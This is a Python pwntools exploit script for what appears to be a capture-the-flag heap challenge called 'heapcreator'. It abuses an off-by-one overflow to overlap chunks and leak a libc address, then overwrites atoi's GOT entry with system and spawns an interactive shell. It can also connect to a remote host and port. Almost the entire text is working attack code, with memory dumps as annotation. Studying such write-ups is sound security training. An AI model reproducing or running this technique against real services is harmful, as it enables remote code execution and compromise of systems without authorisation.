# --==[[ Off-by-One overflow => unsafe unlink

from pwn import *

atoi_got = 0x602060
sys_off  = 0x46590

def alloc(size, data):

	r.sendlineafter('choice :', '1')
	r.sendlineafter('Heap : ', str(size))

	if size < len(data):
		data += "\n"
	r.sendafter('heap:', data)

	return

def free(idx):

	r.sendlineafter('choice :', '4')
	r.sendlineafter('Index :', str(idx))

	return

def edit(idx, data):

	r.sendlineafter('choice :', '2')
	r.sendlineafter('Index :', str(idx))
	r.sendafter('heap : ', data)

	return

def dump(idx):

	r.sendlineafter('choice :', '3')
	r.sendlineafter('Index :', str(idx))

	r.recvuntil('A'*8)

	return u64(r.recv(6).ljust(8, '\x00'))

def pwn():

	alloc(0x88, 'A'*0x88)	# chunk 0
	alloc(0x108, 'B'*0x108)	# chunk 1	

	free(0)
	
	alloc(0x8, 'A'*8)
	
	####################################################################
	#
	#	0x603000:	0x0000000000000000	0x0000000000000021
	#	0x603010:	0x0000000000000008	0x0000000000603030
	#	0x603020:	0x0000000000000000	0x0000000000000021
	#	0x603030:	0x4141414141414141	0x00007ffff7dd3838 <-- main_arena + 216
	#
	####################################################################
		
	leak   = dump(0)
	libc   = leak - 0x3c2838
	system = libc + sys_off

	log.info("Leak:   0x{:x}".format(leak))
	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))

	alloc(0x208,  'C'*0x208)  # chunk 2
	alloc(0x108,  'D'*0x108)  # chunk 3

	edit(1, 'B'*0x100 + p64(0x160) + p8(0x10))

	####################################################################
	#
	#	0x603080:	0x4141414141414141	0x0000000000000031 <-- free [ will get unlink'd]
	#	0x603090:	0x00007ffff7dd37d8	0x00007ffff7dd37d8
	#	0x6030a0:	0x4141414141414141	0x4141414141414141
	#	0x6030b0:	0x0000000000000030	0x0000000000000020
	#	0x6030c0:	0x0000000000000108	0x00000000006030e0
	#	0x6030d0:	0x0000000000000000	0x0000000000000111
	#	0x6030e0:	0x4242424242424242	0x4242424242424242
	#	0x6030f0:	0x4242424242424242	0x4242424242424242
	#	0x603100:	0x4242424242424242	0x4242424242424242
	#	0x603110:	0x4242424242424242	0x4242424242424242
	#	0x603120:	0x4242424242424242	0x4242424242424242
	#	0x603130:	0x4242424242424242	0x4242424242424242
	#	0x603140:	0x4242424242424242	0x4242424242424242
	#	0x603150:	0x4242424242424242	0x4242424242424242
	#	0x603160:	0x4242424242424242	0x4242424242424242
	#	0x603170:	0x4242424242424242	0x4242424242424242
	#	0x603180:	0x4242424242424242	0x4242424242424242
	#	0x603190:	0x4242424242424242	0x4242424242424242
	#	0x6031a0:	0x4242424242424242	0x4242424242424242
	#	0x6031b0:	0x4242424242424242	0x4242424242424242					  
	#	0x6031c0:	0x4242424242424242	0x4242424242424242	
	#	0x6031d0:	0x4242424242424242	0x4242424242424242					  
	#	0x6031e0:	0x0000000000000160	0x0000000000000210 <-- to be free'd 
	#	0x6031f0:	0x4343434343434343	0x4343434343434343
	#
	####################################################################

	free(2)

	####################################################################
	#
	#	0x603080:	0x4141414141414141	0x0000000000000371 <-- new consolidated chunk
	#	0x603090:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
	#	0x6030a0:	0x4141414141414141	0x4141414141414141
	#	0x6030b0:	0x0000000000000030	0x0000000000000020
	#	0x6030c0:	0x0000000000000108	0x00000000006030e0
	#	0x6030d0:	0x0000000000000000	0x0000000000000111
	#	0x6030e0:	0x4242424242424242	0x4242424242424242
	#
	####################################################################

	alloc(0x40,  'E'*0x30 + p64(0x8) + p64(atoi_got))

	####################################################################
	#
	#	0x6030b0:	0x4545454545454545	0x4545454545454545 <-- chunk 1
	#	0x6030c0:	0x0000000000000008	0x0000000000602060 <-- atoi's GOT entry
	#
	####################################################################

	# atoi => system
	edit(1, p64(system))

	r.sendline('sh')
	
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./heapcreator')
        pause()
        pwn()
